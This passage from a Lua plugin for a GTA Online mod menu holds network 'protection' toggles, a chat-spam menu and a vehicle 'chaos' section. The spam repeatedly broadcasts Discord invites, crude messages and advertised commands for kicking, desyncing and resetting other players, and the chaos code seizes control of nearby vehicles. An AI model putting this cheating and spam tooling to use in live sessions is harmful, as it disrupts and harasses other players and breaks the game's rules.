		for k,ent in pairs(entities.get_all_peds_as_handles()) do
			if not PED.IS_PED_A_PLAYER(ent) then
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)

			end
			ct = ct + 1
		end
		for k,ent in pairs(entities.get_all_objects_as_handles()) do
			if ent ~= PLAYER.PLAYER_PED_ID() then
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				ct = ct + 1
			end
		end
			for k,ent in pairs(entities.get_all_pickups_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				util.yield()
			return
		end
	end)

	menu.divider(protex, "Currupt Protections")

	
	menu.toggle(protex, "Toggle Block all Network Events", {}, "This breaks the game, so only leave it on if you are worried about an incoming modder attack", function(on_toggle)
		local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
		local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
		if on_toggle then
			menu.trigger_command(BlockNetEvents)
			notification("Toggling block all network events on... Get those cunts!", colors.red)
		else
			menu.trigger_command(UnblockNetEvents)
			notification("Toggling block all network events off...", colors.red)
		end
	end)


	menu.toggle(protex, "Toggle Block all Incoming Syncs", {}, "This breaks the game, so only leave it on if you are worried about an incoming modder attack", function(on_toggle)
		local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
		local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
		if on_toggle then
			menu.trigger_command(BlockIncSyncs)
			notification("Toggling block all incoming syncs on... Get those cunts!", colors.red)
		else
			menu.trigger_command(UnblockIncSyncs)
			notification("toggling block all incoming syncs off...", colors.red)
		end
	end)

	menu.toggle(protex, "Toggle Block all Outgoing Syncs", {}, "This breaks the game, and other players will not receive any updates from your client", function(on_toggle)
		if on_toggle then
			notification("Toggling block all outgoing syncs on", colors.red)
			menu.trigger_commands("desyncall on")
		else
			notification("Toggling block all outgoing syncs off", colors.red)
			menu.trigger_commands("desyncall off")
		end
	end)

	menu.toggle(protex, "Toggle Anticrashcam", {"acc"}, "Put this here for redundancy", function(on_toggle)
		if on_toggle then
			notification("Toggling anticrashcam... Get those cunts", colors.red)
			menu.trigger_commands("anticrashcam on")
			menu.trigger_commands("potatomode on")
		else
			notification("Toggling anticrashcam off...", colors.red)
			menu.trigger_commands("anticrashcam off")
			menu.trigger_commands("potatomode off")
		end
	end)

	menu.toggle(protex, "Toggle Panic Mode", {"panic"}, "This will render you basically uncrashable at the cost of disrupting all gameplay", function(on_toggle)
		local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
		local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
		local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
		local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
		if on_toggle then
			notification("Toggling panic mode on... Get those cunts", colors.red)
			menu.trigger_commands("desyncall on")
			menu.trigger_command(BlockIncSyncs)
			menu.trigger_command(BlockNetEvents)
			menu.trigger_commands("anticrashcamera on")
		else
			notification("toggling panic mode off...", colors.red)
			menu.trigger_commands("desyncall off")
			menu.trigger_command(UnblockIncSyncs)
			menu.trigger_command(UnblockNetEvents)
			menu.trigger_commands("anticrashcamera off")
		end
	end)

	spams = menu.list(menu.my_root(), "Chat Spammers", {}, "", function(); end)
	menu.divider(spams, "Chat Spammers")

	helpcommands = menu.list(spams, "Help Commands", {}, "Command: helpcommands", function(); end)

menu.action(helpcommands, "Help Commands", {"helpcommands"}, "", function()
    chat.send_message(
        "/help1 /help2 /help3 /help4 /help5 /carhelpa /carhelpb /carhelpc /casinohel1 /casinohelp2 /whatmenu /khos",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(helpcommands, "Help Commands", {"helpcommand"}, "", function(on_toggle)
    chat.send_message(
        "/help1 /help2 /help3 /help4 /help5 /carhelpa /carhelpb /carhelpc /casinohel1 /casinohelp2 /whatmenu /khos",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

menu.toggle_loop(helpcommands, "Type Help Commands", {"typehelpcommand"}, "", function(on_toggle)
    chat.send_message(
        "Type /helpcommands for help",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

	khosspams = menu.list(spams, "Join Kwengz Discord", {}, "Command: khos", function(); end)

menu.action(khosspams, "Join Kwengz Discord", {"khos"}, "", function()
    chat.send_message(
        "Please Join Our Discord > discord.gg/KHOS < Mod menu Giveaways From Kwengz Server! #KWENGZ-IS-KING",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(khosspams, "Join Kwengz Discord", {"khos"}, "", function(on_toggle)
    chat.send_message(
        "Please Join Our Discord > discord.gg/KHOS < Mod menu Giveaways From Kwengz Server! #KWENGZ-IS-KING",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

	kwengzlinkspams = menu.list(spams, "Join Kwengz Discord Candy's Link", {}, "Command: kwengzlink", function(); end)

menu.action(kwengzlinkspams, "Join Kwengz Discord Candy's Link", {"kwengzlink"}, "", function()
    chat.send_message(
        "Please Join Our Discord > discord.gg/CMxfrbvdm7 < Mod menu Giveaways From Kwengz Server! #KWENGZ-IS-KING",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(kwengzlinkspams, "Join Kwengz Discord Candy's Link", {"kwengzlink"}, "", function(on_toggle)
    chat.send_message(
        "Please Join Our Discord > discord.gg/CMxfrbvdm7 < Mod menu Giveaways From Kwengz Server! #KWENGZ-IS-KING",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

	curruptlink = menu.list(spams, "Join Currupt Discord Link", {}, "Command: curruptlink", function(); end)

menu.action(curruptlink, "Join Currupt Script Discord Link", {"curruptlink"}, "", function()
    chat.send_message(
        "Please Join Currupt Script Discord > discord.gg/d6ZnaQakpY < Open discord hit the + to join server and type my link!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(curruptlink, "Join Currupt Script Discord Link", {"curruptlink"}, "", function(on_toggle)
    chat.send_message(
        "Please Join Currupt Script Discord > discord.gg/d6ZnaQakpY < Open discord hit the + to join server and type my link!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

	candylinkspams = menu.list(spams, "Join CandyPie Mods Discord Link", {}, "Command: candylink", function(); end)

menu.action(candylinkspams, "Join CandyPie Mods Discord Link", {"candylink"}, "", function()
    chat.send_message(
        "Please Join Currupt Script Discord > discord.gg/XHhqfbaqTN < Open discord hit the + to join server and type my link!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(candylinkspams, "Join CandyPie Mods Discord Link", {"candylink"}, "", function(on_toggle)
    chat.send_message(
        "Please Join Currupt Script Discord > discord.gg/XHhqfbaqTN < Open discord hit the + to join server and type my link!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

	carhelpa = menu.list(spams, "Gift Car A", {}, "Command: carhelpa", function(); end)

menu.action(carhelpa, "Gift Car A", {"carhelpa"}, "", function()
    chat.send_message(
        "Fill a garage with LOW END/FREE cars in a 2 car garage order 2 free or cars steal them!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(carhelpa, "Gift Car A", {"carhelpa"}, "", function(on_toggle)
    chat.send_message(
        "Fill a garage with LOW END/FREE cars in a 2 car garage order 2 free or cars steal them!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

	carhelpb = menu.list(spams, "Gift Car B", {}, "Command: carhelpb", function(); end)

menu.action(carhelpb, "Gift Car B", {"carhelpb"}, "", function()
    chat.send_message(
        "Put away all your personal vehicles! Type: /spawn NAME then go to garage and type /gift YOURNAME",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(carhelpb, "Gift Car B", {"carhelpb"}, "", function(on_toggle)
    chat.send_message(
        "Put away all your personal vehicles! Type: /spawn NAME then go to garage and type /gift YOURNAME",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

	carhelpc = menu.list(spams, "Gift Car C", {}, "Command: carhelpc", function(); end)

menu.action(carhelpc, "Gift Car C", {"carhelpc"}, "", function()
    chat.send_message(
        "Repete first steps to do it again",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(carhelpc, "Gift Car C", {"carhelpc"}, "", function(on_toggle)
    chat.send_message(
        "Repete first steps to do it again",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

	help1 = menu.list(spams, "Commands A", {}, "Command: help1", function(); end)

menu.action(help1, "Commands A", {"help1"}, "", function()
    chat.send_message(
        "/rankplayer NAME /crazydrop NAME /cashon NAME /cashoff NAME /killgod NAME /killgodv2 NAME /monkeytroll NAME",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(help1, "Commands A", {"help1"}, "", function(on_toggle)
    chat.send_message(
        "/rankplayer NAME /crazydrop NAME /cashon NAME /cashoff NAME /killgod NAME /killgodv2 NAME /monkeytroll NAME",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

	help2 = menu.list(spams, "Commands B", {}, "Command: help2", function(); end)

menu.action(help2, "Commands B", {"help2"}, "", function()
    chat.send_message(
        "/max NAME /boost NAME /curruptboost NAME /resetacc NAME /repair NAME /invon NAME /invoff NAME",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(help2, "Commands B", {"help2"}, "", function(on_toggle)
    chat.send_message(
        "/max NAME /boost NAME /curruptboost NAME /resetacc NAME /repair NAME /invon NAME /invoff NAME",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

	help3 = menu.list(spams, "Commands C", {}, "Command: help3", function(); end)

menu.action(help3, "Commands C", {"help3"}, "", function()
    chat.send_message(
        "Command list: /ceopayNAME - /givecollectiblesNAME - /rpNAME  - /armNAME - /ammoNAME - /autohealNAME - /bailNAME - /giveotrNAME",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(help3, "Commands C", {"help3"}, "", function(on_toggle)
    chat.send_message(
        "Command list: /ceopayNAME - /givecollectiblesNAME - /rpNAME  - /armNAME - /ammoNAME - /autohealNAME - /bailNAME - /giveotrNAME",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

	help4 = menu.list(spams, "Commands D", {}, "Command: help4", function(); end)

menu.action(help4, "Commands D", {"help4"}, "", function()
    chat.send_message(
        "/armNAME /ammoNAME /autohealNAME /bailNAME- No Cops /giveotrNAME - Off the Radar",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(help4, "Commands D", {"help4"}, "", function(on_toggle)
    chat.send_message(
        "/armNAME /ammoNAME /autohealNAME /bailNAME- No Cops /giveotrNAME - Off the Radar",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

	help5 = menu.list(spams, "Commands E", {}, "Command: help5", function(); end)

menu.action(help5, "Commands E", {"help5"}, "", function()
    chat.send_message(
        "/block NAME /boop NAME /desynckick NAME /storymode NAME /kickv1 NAME",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(help5, "Commands E", {"help5"}, "", function(on_toggle)
    chat.send_message(
        "/block NAME /boop NAME /desynckick NAME /storymode NAME /kickv1 NAME",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

	moneyhelp = menu.list(spams, "Money Drop Method", {}, "Command: moneyhelp", function(); end)

menu.action(moneyhelp, "Money Drop Method", {"moneyhelp"}, "", function()
    chat.send_message(
        "If you want new safe money method type /cashNAME 3600 its a timer not ammount if faster than 3600 you just get errors /cashNAME 0 to stop",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(moneyhelp, "Money Drop Method", {"moneyhelp"}, "", function(on_toggle)
    chat.send_message(
        "If you want new safe money method type /cashNAME 3600 its a timer not ammount if faster than 3600 you just get errors /cashNAME 0 to stop",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

	casinohelp1 = menu.list(spams, "Roulette Method", {}, "Command: casinohelp1", function(); end)

menu.action(casinohelp1, "Roulette Method", {"casinohelp1"}, "", function()
    chat.send_message(
        "If u wunna make money come to casino play roulette and bet max on 1st 12(50k) and Red 1(5k), win 3 loose 1 550k a minute",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(casinohelp1, "Roulette Method", {"casinohelp1"}, "", function(on_toggle)
    chat.send_message(
        "If u wunna make money come to casino play roulette and bet max on 1st 12(50k) and Red 1(5k), win 3 loose 1 550k a minute",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

	casinohelp2 = menu.list(spams, "Blackjack Method", {}, "Command: casinohelp2", function(); end)

menu.action(casinohelp2, "Blackjack Method", {"casinohelp2"}, "", function()
    chat.send_message(
        "If u wunna make money come to casino play blackjack! Click max bet then hit stand and win 2x your bet!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(casinohelp2, "Blackjack Method", {"casinohelp2"}, "", function(on_toggle)
    chat.send_message(
        "If u wunna make money come to casino play blackjack! Click max bet then hit stand and win 2x your bet!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

	whatmenu = menu.list(spams, "What Menu Do I Use?", {}, "Command: whatmenu", function(); end)

menu.action(whatmenu, "What Menu Do I Use?", {"whatmenu"}, "", function()
    chat.send_message(
        "I use Stand Ultimate, 2take1 VIP, Midnight, Nightfall, Cherax all co loaded and I'm waiting for North update... :) ",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(whatmenu, "What Menu Do I Use?", {"whatmenu"}, "", function(on_toggle)
    chat.send_message(
        "I use Stand Ultimate, 2take1 VIP, Midnight, Nightfall, Cherax all co loaded and I'm waiting for North update... :) ",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(150000)
end)

	imfuckinggod = menu.list(spams, "I'm Fucking God", {}, "Command: imfuckinggod", function(); end)

menu.action(imfuckinggod, "I'm Fucking God", {"imfuckinggod"}, "", function()
    chat.send_message(
        "I'M FUCKING GOD!!!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(50)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(imfuckinggod, "I'm Fucking God", {"imfuckinggod"}, "", function(on_toggle)
    chat.send_message(
        "I'M FUCKING GOD!!!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(50)
end)

	reportme = menu.list(spams, "Report Me", {}, "Command: reportme", function(); end)

menu.action(reportme, "Report Me", {"reportme"}, "", function()
    chat.send_message(
        "REPORT ME!!!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(50)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(reportme, "Report Me", {"reportme"}, "", function(on_toggle)
    chat.send_message(
        "REPORT ME!!!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(50)
end)


	ilovezelensky = menu.list(spams, "I <3 ZELEN", {}, "Command: ilovezelensky", function(); end)

menu.action(ilovezelensky, "I <3 ZELEN", {"ilovezelensky"}, "Russians hate this ;)", function()
    chat.send_message(
        "I <3 PRESIDENT VOLODYMYR ZELENSKYY",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(50)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(ilovezelensky, "I <3 ZELEN", {"ilovezelensky"}, "Russians hate this ;)", function(on_toggle)
    chat.send_message(
        "I <3 PRESIDENT VOLODYMYR ZELENSKYY",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(50)
end)

	iloveputin = menu.list(spams, "I <3 PUTIN", {}, "Command: iloveputin", function(); end)

menu.action(iloveputin, "I <3 PUTIN", {"iloveputin"}, "Ukranians hate this ;)", function()
    chat.send_message(
        "I <3 PRESIDENT VOLODYMYR PUTIN",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(50)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(iloveputin, "I <3 PUTIN", {"iloveputin"}, "Ukranians hate this ;)", function(on_toggle)
    chat.send_message(
        "I <3 PRESIDENT VOLODYMYR PUTIN",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(50)
end)

	yuminwoman = menu.list(spams, "Yumin Woman", {}, "Command: yuminwoman", function(); end)

menu.action(yuminwoman, "Yumin Woman", {"yuminwoman"}, "AUUUUUUUUUGGHH", function()
    chat.send_message(
        "Yumin woman! AUUUUUUUUUGGHH!!!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(50)
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(yuminwoman, "Yumin Woman", {"yuminwoman"}, "AUUUUUUUUUGGHH", function(on_toggle)
    chat.send_message(
        "Yumin woman! AUUUUUUUUUGGHH!!!",
        false, -- in team chat
        true, -- add to local history
        true  -- networked
        )
    util.yield(50)
end)
----------------------Fun Shit-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

util.keep_running()
local player = players.user_ped()
local agroup = "missfbi3ig_0"
local anim = "shit_loop_trev"
local mshit = util.joaat("prop_big_shit_02")
local rshit = util.joaat("prop_big_shit_01")

list = menu.list(funfun, "Poop", {"lpoop"}, "Poo list", function(); end)

menu.action(list, "Massive shit", {"mshit"}, "Make a massive shit", function()
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    c.z = c.z -1
    while not STREAMING.HAS_ANIM_DICT_LOADED(agroup) do 
        STREAMING.REQUEST_ANIM_DICT(agroup)
        util.yield()
    end
    TASK.TASK_PLAY_ANIM(player, agroup, anim, 8.0, 8.0, 3000, 0, 0, true, true, true)
    util.yield(1000)
    entities.create_object(mshit, c)
end)

menu.action(list, "Normal shit", {"nshit"}, "Make a normale sized shit", function()
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    c.z = c.z -1
    while not STREAMING.HAS_ANIM_DICT_LOADED(agroup) do 
        STREAMING.REQUEST_ANIM_DICT(agroup)
        util.yield()
    end
    TASK.TASK_PLAY_ANIM(player, agroup, anim, 8.0, 8.0, 3000, 0, 0, true, true, true)
    util.yield(1000)
    entities.create_object(rshit, c)
end)

menu.slider(funfun, "Change seat", {"switchseat"}, "DriverSeat = -1 Passenger = 0 Left Rear = 1 RightRear = 2", -1, 2, -1, 1, function(seatnumber)
	local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
	local vehicle = entities.get_user_vehicle_as_handle()
	PED.SET_PED_INTO_VEHICLE(ped, vehicle, seatnumber)
end)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
local windows = {
    {name = "Front Left", number = 0},
    {name = "Front Right", number = 1},
    {name = "Rear Left", number = 2},
    {name = "Rear Right", number = 3},
    {name = "Front Windscreen", number = 4},
    {name = "Rear Windscreen", number = 5},
    {name = "Mid Left", number = 6},
    {name = "Mid Right", number = 7}
}

drawScriptMenu = function()


local wrolls = menu.list(funfun, "Roll Windows", {}, "", function(); end)

ROLL_DOWN_INDIVIDUAL = menu.list(wrolls, "Roll down individual windows")
    for k, v in pairs(windows) do
        menu.action(ROLL_DOWN_INDIVIDUAL, "Roll down " .. v.name .. " window", {}, "Rolls down " .. v.name .. " window", function()
        currentVehicle = entities.get_user_vehicle_as_handle()
        VEHICLE.ROLL_DOWN_WINDOW(currentVehicle, v.number)
        end)
    end
ROLL_UP_INDIVIDUAL = menu.list(wrolls, "Roll up individual windows")
    for k, v in pairs(windows) do
        menu.action(ROLL_UP_INDIVIDUAL, "Roll up " .. v.name .. " window", {}, "Rolls up " .. v.name .. " window", function()
        currentVehicle = entities.get_user_vehicle_as_handle()
        VEHICLE.ROLL_UP_WINDOW(currentVehicle, v.number)
        end)
    end

menu.action(wrolls, "Roll all down", {"pwcalldown"}, "Rolls all windows of the current vehicle down", function()
    currentVehicle = entities.get_user_vehicle_as_handle()
    VEHICLE.ROLL_DOWN_WINDOWS(currentVehicle)
end)
menu.action(wrolls, "Roll all up", {"pwcallup"}, "Rolls all windows of the current vehicle up", function()
    for k, v in pairs(windows) do
        currentVehicle = entities.get_user_vehicle_as_handle()
        VEHICLE.ROLL_UP_WINDOW(currentVehicle, v.number)
    end
end)

menu.action(wrolls, "Roll down front windows", {"pwcfrontdown"}, "Rolls the front left/front right windows down. Probably the most relevant", function()
    currentVehicle = entities.get_user_vehicle_as_handle()
    VEHICLE.ROLL_DOWN_WINDOW(currentVehicle, 0)
    VEHICLE.ROLL_DOWN_WINDOW(currentVehicle, 1)
end)
menu.action(wrolls, "Roll down rear windows", {"pwcreardown"}, "Rolls the rear left/rear right windows down", function()
    currentVehicle = entities.get_user_vehicle_as_handle()
    VEHICLE.ROLL_DOWN_WINDOW(currentVehicle, 2)
    VEHICLE.ROLL_DOWN_WINDOW(currentVehicle, 3)
end)

end



drawScriptMenu()

	playermode = menu.list(funfun, "Player Modes", {}, "", function(); end)

menu.toggle(playermode, "Hulk Mode", {"hulkmode"}, "Makes you jump high and very strong", function(toggle)
    if toggle then
        menu.trigger_commands("damagemultiplier 10000")
        menu.trigger_commands("superjump")
util.toast("Hulk Mode On")
    else
    menu.trigger_commands("damagemultiplier 1.01")
    menu.trigger_commands("damagemultiplier 1")
        menu.trigger_commands("superjump")
util.toast("Hulk Mode Off")
    end 
end)

menu.toggle(playermode, "Big Foot Mode", {"bigfoot mode"}, "Activates Big Foot off radar and makes you strong and jump high then to Candy's outfit on radar.", function(on)
if on then
    menu.trigger_commands("igorleans")
        menu.trigger_commands("damagemultiplier 10000")
        menu.trigger_commands("superjump")
    menu.trigger_commands("walkstyle verydrunk")
    menu.trigger_commands("otr")
util.toast("Big Foot Mode On") 
else
    menu.trigger_commands("outfit1candydinka")
    menu.trigger_commands("walkstyle poshfemale")
    menu.trigger_commands("damagemultiplier 1.01")
    menu.trigger_commands("damagemultiplier 1")
        menu.trigger_commands("superjump")
    menu.trigger_commands("otr")
util.toast("Candy Mode On")
    end 
end)

menu.toggle(playermode, "Stunt Monkey Mode", {"stuntmonkey"}, "Activates Chimp and makes you jump high then to Candy's outfit.", function(on)
if on then
    menu.trigger_commands("acchimp")
        menu.trigger_commands("superjump")
    menu.trigger_commands("walkstyle mop")
util.toast("Stunt Monkey Mode On") 
else
    menu.trigger_commands("outfit1candydinka")
    menu.trigger_commands("walkstyle poshfemale")
        menu.trigger_commands("superjump")
util.toast("Candy Mode On")
    end 
end)


	trevs = menu.list(playermode, "Trevor Mode", {}, "", function(); end)

menu.toggle(trevs, "Trevor Mode 1", {"trevormode"}, "Activates pervy Trev off radar then to Candy's outfit on radar.", function(on)
if on then
    menu.trigger_commands("trevor")
    menu.trigger_commands("walkstyle verydrunk")
    menu.trigger_commands("otr")
util.toast("Trevor Mode 1 On") 
else
    menu.trigger_commands("outfit1candydinka")
    menu.trigger_commands("walkstyle poshfemale")
    menu.trigger_commands("otr")
util.toast("Candy Mode On")
    end 
end)

menu.toggle(trevs, "Trevor Mode 2", {"trevormode"}, "Activates pervy Trev off radar then to Candy's outfit on radar.", function(on)
if on then
    menu.trigger_commands("outfit1trevor")
    menu.trigger_commands("walkstyle crouched")
    menu.trigger_commands("otr")
util.toast("Trevor Mode 2 On") 
else
    menu.trigger_commands("outfit1candydinka")
    menu.trigger_commands("walkstyle poshfemale")
    menu.trigger_commands("otr")
util.toast("Candy Mode On")
    end 
end)

	menu.toggle(funfun, "2nd Person Perspective", {"2ndpp"}, "Sets your camera in another players/npc's face", function(on_toggle)
			notification("Hahahah look at meeee xD", colors.red)
			menu.trigger_commands("2ndperson")
	end)

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

	worldchaos = menu.list(menu.my_root(), "Chaos Shit", {}, "", function(); end)
	menu.divider(worldchaos, "Chaos mode")

	menu.toggle(worldchaos, "World Destruction", {"worlddestruction"}, "", function(on)
		if on then
			chaos = true
		else
			chaos = false
		end
	end, false)

	drift = false
	menu.toggle(worldchaos, "Shift to Drift", {"driftmode"}, "", function(on_toggle)
		drift = on_toggle
	end)

	local dont_stop = false
	menu.toggle_loop(worldchaos,"Vehicle Fly Nearby vehicles", {"vehflyall"}, "basically 'impulse like sport mode' but applied to every vehicle", function()
		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
				cam_pos = CAM.GET_GAMEPLAY_CAM_ROT(0)
    			ENTITY.SET_ENTITY_ROTATION(veh, cam_pos.x, cam_pos.y, cam_pos.z, 1, true);
				local locspeed = speed*10
				local locspeed2 = speed
				if PAD.IS_CONTROL_PRESSED(0, 61) then
					locspeed = locspeed*2
					locspeed2 = locspeed2*2
				end
				if PAD.IS_CONTROL_PRESSED(2, 71) then
					if dont_stop then
						ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, speed, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
					else 
						VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, locspeed)
					end
				end
				if PAD.IS_CONTROL_PRESSED(2, 72) then
					local lsp = speed
					if not PAD.IS_CONTROL_PRESSED(0, 61) then 
						lsp = speed * 2
					end
					if dont_stop then
						ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0 - (lsp), 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
					else 
						VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0 - (locspeed));
					end
			   end
				if PAD.IS_CONTROL_PRESSED(2, 63) then
					local lsp = (0 - speed)*2
					if not PAD.IS_CONTROL_PRESSED(0, 61) then 
						lsp = 0 - speed
					end
					if dont_stop then
						ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, (lsp), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
					else 
						ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0 - (locspeed), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1);
					end
				end
				if PAD.IS_CONTROL_PRESSED(2, 64) then
					local lsp = speed
					if not PAD.IS_CONTROL_PRESSED(0, 61) then 
						lsp = speed*2
					end
					if dont_stop then
						ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, lsp, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
					else 
						ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, locspeed, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
					end
				end
				if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
					VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)

	local dont_stop = false
	menu.toggle_loop(worldchaos,"Vehicle Blackhole", {"blackhole"}, "Basically 'impulse like sport mode. but applied to every vehicle", function(on)
		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			local locspeed2 = speed
        			local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
